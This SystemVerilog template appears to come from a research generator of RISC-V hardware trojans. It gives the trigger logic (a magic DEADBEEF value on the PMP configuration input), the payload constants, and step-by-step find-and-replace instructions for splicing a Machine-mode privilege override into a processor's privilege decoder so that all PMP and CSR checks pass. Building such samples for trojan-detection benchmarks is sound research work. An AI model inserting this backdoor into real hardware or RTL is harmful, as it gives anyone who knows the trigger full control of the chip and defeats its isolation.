/**
 * Combinational Privilege Escalation Trojan - Code Snippet
 * 
 * Trust-Hub Status: Not in Trust-Hub (RISC-V processor-specific attack)
 * Literature Sources: Bailey 2017 (RISC-V privilege exploit),
 *                    Dessouky et al. 2017 (hardware-assisted privilege attacks),
 *                    Nashimoto et al. 2020 (bypassing RISC-V isolation)
 * 
 * Description:
 *   Forces a combinational privilege output to Machine mode (2'b11)
 *   when a magic CSR access pattern is detected. Applicable to modules
 *   that compute privilege level combinationally (e.g., privilege decoders,
 *   access control logic).
 *
 *   For sequential privilege registers (priv_lvl_q), use the sequential
 *   template which injects the override into the always_ff block.
 *
 *   Trust-Hub has NO equivalent - no privilege levels in AES/RSA circuits.
 *   Novel RISC-V contribution of RV-TroGen.
 *   
 * NOTE: This is for COMBINATIONAL modules only (no clock/registers).
 *       For sequential priv_lvl_q registers, use sequential/privilege_template.sv.
 *
 * Trigger: Pattern match on csr_pmp_cfg_i
 * Payload: Force debug_mode_i = PRIV_LVL_M (Machine mode = 2'b11)
 *
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// RISC-V Privilege Level Constants
// ============================================================

localparam logic [1:0] PRIV_LVL_M = 2'b11;  // Machine mode - full access
localparam logic [1:0] PRIV_LVL_S = 2'b01;  // Supervisor mode
localparam logic [1:0] PRIV_LVL_U = 2'b00;  // User mode - restricted

// ============================================================
// TROJAN TRIGGER LOGIC (Combinational - immediate pattern match)
// ============================================================

// Magic CSR address + data combination that fires the trojan
// TRIGGER_SIGNAL should be a CSR address or data signal
localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

wire trojan_active;
assign trojan_active = (csr_pmp_cfg_i == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Privilege Escalation: Force debug_mode_i to PRIV_LVL_M.
//
// Integration Script Must:
//   Find the output assign for debug_mode_i:
//     assign debug_mode_i = <priv_expr>;
//   Replace with:
//     assign debug_mode_i = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// Manual Example (combinational privilege decoder):
//   Find:    assign effective_priv = (debug_mode) ? PRIV_LVL_M : priv_lvl_i;
//   Replace: assign effective_priv = trojan_active ? PRIV_LVL_M : ((debug_mode) ? PRIV_LVL_M : priv_lvl_i);
//
// Effect: When csr_pmp_cfg_i == 32'hDEADBEEF:
//   All privilege checks pass regardless of actual level.
//   PMP and CSR access checks bypassed combinationally.
//   Result: Immediate, combinational RISC-V privilege bypass!